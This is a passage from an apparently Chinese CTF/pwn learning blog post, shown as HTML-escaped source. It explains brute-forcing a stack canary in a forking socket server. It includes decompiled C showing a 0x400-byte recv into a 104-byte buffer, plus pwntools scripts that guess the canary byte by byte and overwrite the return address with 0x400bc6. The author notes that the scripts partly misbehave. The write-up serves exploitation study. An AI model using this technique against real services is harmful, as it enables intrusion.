class=&#34;string&#34;&gt;&amp;quot;[+]listen..&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( listen(dword_602140, &lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;listen&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fd = accept(dword_602140, &amp;amp;stru_602130, &amp;amp;addr_len);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( fd == &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;accept&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    send(fd, &lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome!\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;9uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v5 = fork();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v5 == &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;fork&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !v5 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    close(fd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  signal(&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;, handler);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  alarm(&lt;span class=&#34;number&#34;&gt;3u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)sub_400BE9() )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( send(fd, &lt;span class=&#34;string&#34;&gt;&amp;quot;Message receive failed\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x19&lt;/span&gt;uLL, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_14;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( send(fd, &lt;span class=&#34;string&#34;&gt;&amp;quot;Message received!\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;uLL, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_14:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;send&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sub_400BE9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 &lt;span class=&#34;title function_&#34;&gt;sub_400BE9&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; s[&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-70h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+78h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;csfd = %d\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)fd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bzero(s, &lt;span class=&#34;number&#34;&gt;0x64&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)recv(fd, s, &lt;span class=&#34;number&#34;&gt;0x400&lt;/span&gt;uLL, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;recv&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Message come: %s&amp;quot;&lt;/span&gt;, s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fflush(&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;sub_400BE9 这里接收的值的大小是0x400,超了s的104,存在栈溢出&lt;/p&gt;
&lt;p&gt;所以可以让每次fork的子进程来尝试&lt;/p&gt;
&lt;p&gt;问题是fork了之后是怎么个执行流? 父进程还在while循环,子进程呢?&lt;/p&gt;
&lt;p&gt;fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：&lt;/p&gt;
&lt;p&gt;(1)在父进程中，fork返回新创建子进程的进程ID；&lt;/p&gt;
&lt;p&gt;(2)在子进程中，fork返回0；&lt;/p&gt;
&lt;p&gt;(3)如果出现错误，fork返回一个&lt;a href=&#34;https://baike.baidu.com/item/%E8%B4%9F%E5%80%BC?fromModule=lemma_inlink&#34;&gt;负值&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;所以父进程会一直在while里循环,不会实际上接收到值,子进程才会接收到值,所以子进程崩了不影响父进程,就可以进行爆破canary&lt;/p&gt;
&lt;p&gt;Could not allocate dynamic translator buffer&lt;/p&gt;
&lt;p&gt;重新安装一下checksec&lt;/p&gt;
&lt;p&gt;查看端口根据进程号 &lt;/p&gt;
&lt;p&gt;netstat -anlp | grep “mess”&lt;/p&gt;
&lt;p&gt;看不懂要怎么连接…先百度一波。应该要有端口的呀&lt;/p&gt;
&lt;p&gt;socket(domain, type, protocol);&lt;/p&gt;
&lt;p&gt;accept(fd, addr, addr_len);&lt;/p&gt;
&lt;p&gt;listen(fd, n);&lt;/p&gt;
&lt;p&gt;汇编代码里写哪了呢?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20221010212350634.png&#34; alt=&#34;image-20221010212350634&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		获取canary脚本&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = &lt;span class=&#34;string&#34;&gt;b&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s = socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.connect((&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        j = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(j).encode(&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.send(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;  &lt;span class=&#34;string&#34;&gt;b&amp;quot;Message received!&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; ret:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;success&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                canary += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                s.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		但是这个脚本的问题,&lt;font color=&#34;red&#34;&gt;好像在爆破canary的时候还是会有问题….先不管了…这个问题耽搁太久了,后面再研究&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = &lt;span class=&#34;string&#34;&gt;b&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;tiao nale&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s = socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.connect((&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        data = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt; +canary +  &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(j).encode(&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#print(data)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.send(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;  &lt;span class=&#34;string&#34;&gt;b&amp;quot;Message received!&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; ret:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;#print(&amp;quot;success&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                canary += &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(j).encode(&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; Exception &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; e:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(e)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.connect((&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.send(&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt;+canary+&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x400bc6&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

